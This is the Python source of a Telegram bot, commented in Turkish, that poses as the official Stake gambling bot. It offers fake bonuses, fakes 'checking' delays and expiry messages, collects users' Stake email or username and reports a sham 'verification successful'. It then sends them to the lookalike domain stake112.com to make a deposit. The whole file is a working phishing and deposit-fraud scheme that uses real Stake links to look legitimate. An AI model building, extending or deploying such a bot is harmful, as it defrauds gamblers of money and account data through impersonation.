import asyncio
import os
from urllib.parse import quote

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

TOKEN = os.environ["BOT_TOKEN"]

SITE_URL = "https://stake112.com/"

def build_personal_link(user_input: str) -> str:
    text = user_input.strip()
    user_type = "email" if "@" in text else "username"
    safe_text = quote(text)  # link bozulmasın diye güvenli hale getirir

    return f"{SITE_URL}?user={safe_text}&type={user_type}"

# ========== BİREBİR METİNLER ==========
START_TEXT = (
    "🔹 These offers are available for a limited time.\n\n"
    "🔹 The Stake Bot provides daily Codes and Bonuses.\n\n"
    "🔹 Get exclusive promotions regardless of Rank or VIP level.\n\n"
    "🔹 Contact Stake Customer Support without waiting times.\n\n"
    "<a href='https://stake.com'>Stake</a> • "
    "<a href='https://t.me/stake'>Telegram</a> • "
    "<a href='https://twitter.com/stake'>Twitter</a> • "
    "<a href='https://stake.com/support'>Support</a> • "
    "<a href='https://stake.com/affiliate'>Affiliate</a> • "
    "<a href='https://stake.com/forum'>Forum</a>"
)


MAIN_BUTTON = "🎄Claim Bonus"

CLAIM_MENU_TITLE = "Choose your Bonus below:"
OPT1_TEXT = "🏆 %200 Deposit Bonus"
OPT2_TEXT = "🎁 50$ Risk-Free Bet"
OPT3_TEXT = "🎲 75 Free Spins on Pragmatic."

OPT2_EXPIRED = (
    "⌛Sorry, this offer has expired.\n"
    "💰50$ Risk-Free Bet is no longer available.\n"
    "You can try another bonus from the menu."
)

OPT3_EXPIRED = (
    "⌛Sorry, this offer has expired.\n"
    "💰75 Free Spins from Pragmatic are no longer available.\n"
    "You can try another bonus from the menu."
)

OPT1_DETAILS = (
    "✅ You've selected the %200 Bonus.\n\n"
    "Requirements:\n"
    "💸 Minimum Deposit: $25\n"
    "💰 Maximum Deposit: $25,000\n"
    "🎰 Wager Requirement: x1\n\n"
    "💡 Example: Deposit $100 to get $300 credited to your Stake account.\n"
    "You must place bets totaling $300 to complete the wagering requirement.\n"
    "Cash-out bets may not count toward wagering.\n\n"
    "⚠️ The validity of this bonus expires on December 31 at 23:59 UTC and applies to a one-time deposit under this promotion."
)

# (Foto 7 metnini sen tam vermemiştin; burada placeholder bıraktım — istersen birebir metni yazarsın)
DOMAIN_SELECT_TEXT = (
    "✅ Your bonus is ready to claim.\n\n"
    "To activate your bonus, please select your platform."
)

CONNECT_SELECT_TEXT = (
    "🔗 Connected. Please link your account.\n"
    "We will never ask for your password or personal information."
)

EMAIL_SCREEN_TEXT = (
    "✉️ Please enter your Stake E-mail address below.\n"
    "Your account will be linked to the Bot to activate your bonus"
)

USERNAME_SCREEN_TEXT = (
    "👤 Please enter your Stake username below.\n"
    "Your account will be linked to the Bot to activate your bonus."
)

CHECKING_TEXT = "🛰️ checking user database..."
SUCCESS_TEXT = "✅ Verification successful."

FINAL_TEXT_TEMPLATE = (
    "🎉 Congratulations {user}, your bonus is active!\n\n"
    "Click the {domain} link below to complete your bonus deposit."
)


# ========== /start ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🎄Claim Bonus", callback_data="claim_bonus")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_photo(
        photo="https://i.hizliresim.com/lz63tw3.png",
        caption=START_TEXT,
        reply_markup=reply_markup,
        parse_mode="HTML",
    )




# ========== Kullanıcı input (email/username) ==========
async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    awaiting = context.user_data.get("awaiting_input")
    if awaiting not in ["username", "email"]:
        return

    user_value = (update.message.text or "").strip()

    # basit doğrulama (senin önceki mantığın)
    if awaiting == "email":
        if "@" not in user_value or "." not in user_value:
            await update.message.reply_text(
                "❌ Invalid email format.\n\nPlease enter a valid email address."
            )
            return

    if awaiting == "username":
        if len(user_value) < 3:
            await update.message.reply_text(
                "❌ Username too short.\n\nPlease enter a valid username."
            )
            return

    # kayıt
    context.user_data["awaiting_input"] = None
    context.user_data["last_input"] = user_value

    # checking
    await update.message.reply_text(CHECKING_TEXT)

    await asyncio.sleep(3)

        # hangi domain seçildi?
    domain_key = context.user_data.get("selected_domain")

    links = {
        "domain_1": "https://stake112.com/",
        "domain_2": "https://stake112.com/",
        "domain_3": "https://stake112.com/",
    }
    user_value = context.user_data.get("last_input", "")
    safe_user = quote(user_value.strip())
    final_url = f"{links.get(domain_key, 'https://example.com')}?user={safe_user}"

    caption = (
        f"🎉 Verification successful {user_value}, your bonus is now active!\n"
        f"Click the Stake link below to complete your bonus deposit."
    )

    keyboard = [[InlineKeyboardButton("🎄 Activate Bonus", url=final_url)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_photo(
        photo="https://hizliresim.com/7som0l0",
        caption=caption,
        reply_markup=reply_markup
    )



# ========== Button handler ==========
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "back_to_claim_menu":
        keyboard = [
            [InlineKeyboardButton(OPT1_TEXT, callback_data="opt1")],
            [InlineKeyboardButton(OPT2_TEXT, callback_data="opt2")],
            [InlineKeyboardButton(OPT3_TEXT, callback_data="opt3")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Bu ekran foto+caption olduğu için TEXT değil CAPTION editle!
        await query.edit_message_caption(
            caption=CLAIM_MENU_TITLE,
            reply_markup=reply_markup
        )
        return

    # Ana menüye dönüş (sadece üst seviyede)
    if query.data == "go_back_main":
        keyboard = [[InlineKeyboardButton("🎄Claim Bonus", callback_data="claim_bonus")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            await query.edit_message_caption(
                caption=START_TEXT,
                reply_markup=reply_markup,
                parse_mode="HTML",
            )
        except Exception:
            # Eğer mesaj foto değilse (nadiren), yeni mesaj at
            await query.message.reply_photo(
                photo="https://YOUR_START_IMAGE_URL",
                caption=START_TEXT,
                reply_markup=reply_markup,
                parse_mode="HTML",
            )
        return

    # Claim Bonus -> 3 opsiyon (Foto 3)
    if query.data == "claim_bonus":
        keyboard = [
            [InlineKeyboardButton("🏆 %200 Deposit Bonus", callback_data="opt1")],
            [InlineKeyboardButton("🎁 50$ Risk-Free Bet", callback_data="opt2")],
            [InlineKeyboardButton("🎲 75 Free Spins on Pragmatic.", callback_data="opt3")],
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        # Yeni fotoğraflı mesaj gönder
        await query.message.reply_photo(
            photo="https://i.hizliresim.com/lz63tw3.png",
            caption=CLAIM_MENU_TITLE,
            reply_markup=reply_markup
        )

        # Eski (start) menüsünü temizlemek istersen:
        try:
            await query.message.delete()
        except Exception:
            pass

        return


    # Option 1 -> details (Foto 6)
    if query.data == "opt1":
        keyboard = [
            [InlineKeyboardButton("🎁 Claim Bonus", callback_data="claim_step_1")],
            [InlineKeyboardButton("⬅️ Go Back", callback_data="back_to_claim_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_caption(
             caption=OPT1_DETAILS,
             reply_markup=reply_markup
        )
        return

    # Option 2 -> checking -> expired (Foto 4) -> geri 3 opsiyona (sen böyle istemiştin)
    if query.data == "opt2":
        await query.edit_message_caption("⏳ Checking bonus availability...")
        await asyncio.sleep(2)

        keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data="back_to_claim_menu")]
        ] 
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_caption(
            caption=OPT2_EXPIRED,
            reply_markup=reply_markup
        )
        return



    # Option 3 -> checking -> expired (Foto 5) -> geri 3 opsiyona
    if query.data == "opt3":
        await query.edit_message_caption("⏳ Checking bonus availability...")
        await asyncio.sleep(2)

        keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data="back_to_claim_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_caption(
            caption=OPT3_EXPIRED,
            reply_markup=reply_markup
        )
        return


    # Domain select (Foto 7) - burada ve sonrasında Go Back YOK
    if query.data == "claim_step_1":
        keyboard = [
            [InlineKeyboardButton("stake.com", callback_data="domain_1")],
            [InlineKeyboardButton("stake.us 🇺🇸", callback_data="domain_2")],
            [InlineKeyboardButton("stake.bet", callback_data="domain_3")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_caption(
            caption=DOMAIN_SELECT_TEXT,
            reply_markup=reply_markup
        )
        return

    # Domain seçildi -> Connect select (Foto 8)
    if query.data in ["domain_1", "domain_2", "domain_3"]:
        context.user_data["selected_domain"] = query.data

        keyboard = [
            [InlineKeyboardButton("📧 Connect with Email", callback_data="connect_email")],
            [InlineKeyboardButton("👤 Connect with Username", callback_data="connect_username")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_caption(
            caption=CONNECT_SELECT_TEXT,
            reply_markup=reply_markup
        )
        return


    # Email screen (Foto 10)
    if query.data == "connect_email":
        context.user_data["awaiting_input"] = "email"
        await query.edit_message_caption(caption=EMAIL_SCREEN_TEXT)
        return


    # Username screen (Foto 9)
    if query.data == "connect_username":
        context.user_data["awaiting_input"] = "username"
        await query.edit_message_caption(caption=USERNAME_SCREEN_TEXT)
        return


# ========== APP ==========
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))
app.run_polling()

